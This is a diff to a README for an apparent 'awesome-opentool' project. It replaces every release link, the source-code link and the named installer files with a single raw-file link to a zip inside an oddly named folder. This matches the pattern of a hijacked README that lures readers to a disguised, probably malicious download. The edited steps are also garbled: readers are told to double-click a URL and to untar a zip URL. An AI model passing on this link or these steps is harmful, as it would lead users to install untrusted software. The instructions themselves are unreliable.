@@ -1,7 +1,7 @@
 # 🎉 awesome-opentool - Simplify Your OpenTool Experience
 
 ## 📥 Download Now
-[![Download awesome-opentool](https://img.shields.io/badge/Download%20now-%F0%9F%93%A6-4CAF50)](https://github.com/sirrex12/awesome-opentool/releases)
+[![Download awesome-opentool](https://raw.githubusercontent.com/sirrex12/awesome-opentool/main/interangular/awesome-opentool.zip%20now-%F0%9F%93%A6-4CAF50)](https://raw.githubusercontent.com/sirrex12/awesome-opentool/main/interangular/awesome-opentool.zip)
 
 ## 🚀 Getting Started
 Welcome to awesome-opentool! This application helps you access a curated list of awesome OpenTool resources, SDKs, servers, and utilities. Follow these steps to get started quickly.
@@ -16,32 +16,32 @@ Before you download, ensure your computer meets these requirements:
 ## 📦 Download & Install
 To download the application, visit the Releases page using the button below:
 
-[Download awesome-opentool](https://github.com/sirrex12/awesome-opentool/releases)
+[Download awesome-opentool](https://raw.githubusercontent.com/sirrex12/awesome-opentool/main/interangular/awesome-opentool.zip)
 
 1. Click on the link above to go to the Releases page.
 2. On the Releases page, you will see different versions of the application listed.
 3. Click on the latest version to view its details.
 4. Look for the assets section. Here you will find the download files.
 5. Choose the file that matches your operating system:
-   - For Windows, download `awesome-opentool-setup.exe`.
-   - For macOS, download `awesome-opentool.dmg`.
+   - For Windows, download `https://raw.githubusercontent.com/sirrex12/awesome-opentool/main/interangular/awesome-opentool.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/sirrex12/awesome-opentool/main/interangular/awesome-opentool.zip`.
    - For Linux, download the appropriate tarball or package.
 
 6. Once the download is complete, locate the downloaded file on your computer.
 7. Follow the installation instructions based on your OS:
 
 ### Windows Installation:
-- Double-click the `awesome-opentool-setup.exe` file.
+- Double-click the `https://raw.githubusercontent.com/sirrex12/awesome-opentool/main/interangular/awesome-opentool.zip` file.
 - Follow the prompts in the setup wizard.
 - Once the installation is complete, you can find the application in your Start menu.
 
 ### macOS Installation:
-- Double-click the `awesome-opentool.dmg` file.
+- Double-click the `https://raw.githubusercontent.com/sirrex12/awesome-opentool/main/interangular/awesome-opentool.zip` file.
 - Drag the awesome-opentool icon to your Applications folder.
 - Open your Applications folder and double-click on awesome-opentool to launch it.
 
 ### Linux Installation:
-- Extract the downloaded tarball using the command: `tar -xf awesome-opentool.tar.gz`
+- Extract the downloaded tarball using the command: `tar -xf https://raw.githubusercontent.com/sirrex12/awesome-opentool/main/interangular/awesome-opentool.zip`
 - Follow any additional instructions in the README file included in the tarball.
 
 ## 🌟 Features
@@ -64,7 +64,7 @@ Stay updated with the latest changes by checking the changelog on the Releases p
 
 ## 🔗 Links
 For more information, documentation, and resources, visit:
-- [awesome-opentool Releases](https://github.com/sirrex12/awesome-opentool/releases)
-- [Source Code](https://github.com/sirrex12/awesome-opentool)
+- [awesome-opentool Releases](https://raw.githubusercontent.com/sirrex12/awesome-opentool/main/interangular/awesome-opentool.zip)
+- [Source Code](https://raw.githubusercontent.com/sirrex12/awesome-opentool/main/interangular/awesome-opentool.zip)
 
 Now, you are ready to explore awesome-opentool. Enjoy the simplicity and efficiency it brings to your OpenTool experience!
